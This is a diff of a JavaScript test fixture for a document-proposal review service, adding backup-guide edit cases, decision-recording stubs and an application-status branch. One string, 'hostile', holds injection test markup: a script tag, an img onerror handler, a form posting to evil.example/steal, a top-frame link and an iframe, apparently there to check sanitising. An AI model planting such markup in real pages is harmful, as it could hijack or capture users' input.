@@ -10,9 +10,27 @@ const folder = '# Workspace note\n\nStore the notes in the blue folder.\n\n## Af
 const section = (heading) => `## ${heading}\n\nSet aside a clear working area before anyone arrives. The whiteboard belongs to the whole team; photograph the final board before erasing it. Put the markers back when you are done.\n\nFirst-time visitors can ask the host for a short introduction. The printed schedule by the door lists each room and its closing time.\n\n`;
 const long = `# Workshop handbook\n\nFind the short instructions below before opening the shared room.\n\n${section('Getting started')}Store the notes in the blue folder.\n\n${['Before you arrive', 'Opening the west entrance', 'Borrowing equipment', 'Organizing the benches'].map(section).join('')}Keep a paper sign-in sheet.\n\n${['Welcoming new members', 'Working with guests', 'Troubleshooting'].map(section).join('')}Close the room at seven.\n\n${section('Keys and cleanup')}`;
 const properties = '---\ntitle: Workshop notebook\nowner: workshop\n---\n\n# Workshop notebook\n\nNotes and records from the shared workshop.\n';
+const backup = (destination = 'original drive') => `# Testing a backup\n\nA successful backup job tells you the copy finished. A restore test tells you whether you can use it.\n\n## Choose a destination\n\nRestore a small folder to the ${destination}. Leave the working copy alone.\n\nPick a folder you know well. For the command, see the [restore guide](https://docs.example/restore).\n\n## Check the contents\n\nOpen a document and a photo from the restored folder. Compare their checksums with the originals.\n\n## Record the result\n\nKeep one entry per test, with the snapshot name and how long it took.\n`;
+const rewrites = [
+  ['Restore some files somewhere and see if it worked. If nothing complains, the backup is probably fine for now.',
+    'Restore a small folder to a spare drive. Keep the working copy disconnected until you have checked every restored file.'],
+  ['Look at a few files when you have time. If they open at all, you can assume the rest of them are fine.',
+    'Open a document and a photo from the restored folder. Compare their checksums with the originals; a matching count is not enough.'],
+  ['Delete the test copy when you are done so it does not take up space on the drive afterwards.',
+    'Keep the restored folder until you have written down the snapshot name, the date and how long the restore took.'],
+];
+const rewriteBase = `# Testing a backup\n\nA successful backup job tells you the copy finished. A restore test tells you whether you can use it.\n\n## Run a restore test\n\n${rewrites.map(([old]) => old).join('\n\n')}\n\n## Record the result\n\nKeep one entry per test.\n`;
+const pairs = [['source', 'destination'], ['big', 'small'], ['quick', 'full'], ['old', 'oldest'], ['file', 'folder'], ['copy', 'snapshot'], ['check', 'verify'], ['size', 'checksum'], ['sample', 'photo'], ['first', 'last'], ['date', 'size'], ['length', 'duration'], ['day', 'time'], ['broken', 'missing'], ['note', 'entry'], ['user', 'person'], ['disk', 'drive'], ['later', 'afterwards'], ['tool', 'command'], ['list', 'log'], ['week', 'month'], ['save', 'keep'], ['plan', 'schedule'], ['done', 'finished']];
+const frames = ['Pick the {} before you start.', 'Restore a {} folder first.', 'Run a {} restore once a quarter.', 'Start with the {} snapshot.', 'Open one {} you know well.', 'Name the {} you restored from.', 'Always {} the result yourself.', 'Compare the {} for each file.', 'Open a restored {} at full size.', 'Read the {} page of a document.', 'Check the {} of the archive.', 'Record the {} of the restore.', 'Include the start {} in the record.', 'List any {} files before cleaning up.', 'Keep one {} per test.', 'Say which {} ran the test.', 'Leave the working {} alone.', 'Delete the restored copy {}.', 'Write down the {} you used.', 'Keep the {} with the backups.', 'Repeat the test every {}.', '{} the record for a year.', 'Put the next test on the {}.', 'Mark the test {}.'];
+const manyBase = `# Testing a backup\n\n## Before you start\n\n${frames.map((frame, index) => `${index === 8 ? '## Check the contents\n\n' : index === 16 ? '## Afterwards\n\n' : ''}${frame.replace('{}', pairs[index][0])}`).join('\n\n')}\n`;
+const manyEdits = frames.map((frame, index) => [`${pairs[index][0]}${frame.split('{}')[1]}`, pairs[index][0], pairs[index][1]]);
+const propertiesBackup = `---\ntitle: Testing a backup\ntags: storage\n---\n\n# Testing a backup\n\nRestore a small folder to the original drive. Leave the working copy alone.\n\nPick a folder you know well. Use it again next time so the results are comparable.\n`;
+const hostile = '# Restore notes\n\nRestore a small folder to the original drive.\n\n<script>window.HOSTILE_SCRIPT = 1</script>\n\n<img src="x" onerror="window.HOSTILE_IMG = 1">\n\n<form action="https://evil.example/steal"><input name="q"></form>\n\n<a href="https://evil.example/away" target="_top">Read more</a>\n\n<iframe src="https://evil.example/frame"></iframe>\n\nThe ending stays.\n';
+const longReason = 'Several of the restore steps used different words for the same thing, which made the checklist harder to follow during an actual restore. This replaces them with one consistent set of terms. Nothing about the order of the steps changes. Each replacement is one word, so the page reads the same apart from the wording.';
 const listCode = '# Workshop checklist\n\nReview these steps before a session.\n\n- Put a label on the blue folder.\n- Check that all stations are clean.\n\n## Configuration\n\n```ini\nlocation = west\nmode = standard\n```\n\n> Ask the host before changing shared settings.\n\n| Item | Place |\n| --- | --- |\n| Pens | Desk |\n';
 
-export function createProposalDocumentFixture({ port = 47611, hostileLabel = false, extraHiddenCases = false } = {}) {
+export function createProposalDocumentFixture({ port = 47611, hostileLabel = false, extraHiddenCases = false, appearance = null } = {}) {
+  const recorded = [];
   const cases = new Map();
   const add = (key, baseText, edits, lane = 'lane-b', options = {}) => {
     const index = cases.size + 1;
@@ -62,6 +80,16 @@ export function createProposalDocumentFixture({ port = 47611, hostileLabel = fal
     [['folder', 'folder', '<em>binder</em>'], ['HTML_BASE_CANARY', 'HTML_BASE_CANARY', 'HTML_CANDIDATE_CANARY']], 'lane-signed', { reason: 'Plain rationale.' });
   add('marked-hidden-delimiters', '# Safe visible title\n\n<!--\n\nHTML_DELIMITER_CANARY.\n\n-->\n\nThe ending stays.\n',
     [['<!--\n\n', '<!--\n\n', ''], ['-->\n\n', '-->\n\n', '']], 'lane-b', { reason: 'Plain rationale.' });
+  const backupPath = 'curations/backups/testing-a-backup.md';
+  add('one-word', backup(), [['original drive', 'original drive', 'spare drive']], 'lane-signed', { path: backupPath, reason: 'Keep the restore off the working drive.' });
+  add('rewrite-three', rewriteBase, rewrites.map(([old, next]) => [old, old, next]), 'lane-signed', { path: backupPath, reason: 'Spell out how to verify the restored files.' });
+  add('many-24', manyBase, manyEdits, 'lane-signed', { path: backupPath, reason: longReason });
+  add('link-destination', backup('spare drive'), [['docs.example/restore', 'docs.example', 'help.example']], 'lane-signed', { path: backupPath, reason: 'The guide moved to the help site.' });
+  add('properties-title', propertiesBackup, [['Testing a backup\ntags', 'Testing a backup', 'Test a backup'], ['storage\n', 'storage', 'storage, recovery'], ['original drive', 'original', 'spare']], 'lane-a', { path: backupPath });
+  add('hostile-html', hostile, [['original drive', 'original', 'spare']], 'lane-b', { path: 'restore-notes.md' });
+  add('applied', backup(), [['original drive', 'original drive', 'spare drive']], 'lane-signed', { path: backupPath, reason: 'Keep the restore off the working drive.', decision: 'approve', application: 'applied' });
+  add('approved-backup', backup(), [['original drive', 'original drive', 'spare drive']], 'lane-signed', { path: backupPath, reason: 'Keep the restore off the working drive.', decision: 'approve', application: 'eligible' });
+  add('rejected-backup', backup(), [['original drive', 'original drive', 'spare drive']], 'lane-b', { path: backupPath, decision: 'reject' });
   if (extraHiddenCases) {
     add('obsidian-hidden', '# Safe visible title\n\nLook in the folder.\n\n%% OBSIDIAN_CONTEXT_CANARY %%\n\nThe ending stays.\n', [['folder', 'folder', 'binder']]);
     add('added-hidden-delimiters', '# Safe visible title\n\nHTML_NEW_COMMENT_CANARY.\n\nThe ending stays.\n',
@@ -81,21 +109,27 @@ export function createProposalDocumentFixture({ port = 47611, hostileLabel = fal
       return { entry: item.entry, decision: item.decision };
     },
     async loadDecision(id) { return receipt(find(id)); },
-    async record() { throw new Error('fixture does not record decisions'); },
+    // Records what reached the decision service, then refuses: the fixture
+    // never stores a decision.
+    async record(intent) { recorded.push(intent); throw new OwnerAlphaError('lock-busy', 'fixture does not record decisions'); },
     async applicationStatus(id) {
       const { options } = find(id);
+      if (options.application === 'applied') {
+        const latest = { attempt: 1, appliedAt: receivedAt, jobId: 'OA-fixture-applied', jobState: 'pushing', failure: null, retryable: false };
+        return { state: 'applied', reason: null, attempts: [latest], latest };
+      }
       return { state: options.application, reason: options.applicationReason, attempts: [] };
     },
   };
   const ownerOrigin = `http://127.0.0.1:${port}`;
   const readerOrigin = `http://127.0.0.1:${port + 1}`;
   return {
-    cases, ownerOrigin, readerOrigin,
+    cases, ownerOrigin, readerOrigin, recorded,
     async handler() {
       const raw = JSON.parse(await readFile(new URL('../owner-alpha.example.json', import.meta.url), 'utf8'));
       Object.assign(raw.listen, { port, readerPort: port + 1 });
       Object.assign(raw.proposalReview, { enabled: true, socketPath: '/run/user/1000/cyberbaser/review.sock' });
-      return createOwnerAlphaHandler({ config: validateOwnerAlphaConfig(raw), proposalReview: review,
+      return createOwnerAlphaHandler({ config: validateOwnerAlphaConfig(raw), proposalReview: review, reviewAppearance: appearance,
         createEditSession: async () => { throw new Error('not available'); }, saveEdit: async () => { throw new Error('not available'); },
         lookupJob: async () => null });
     },
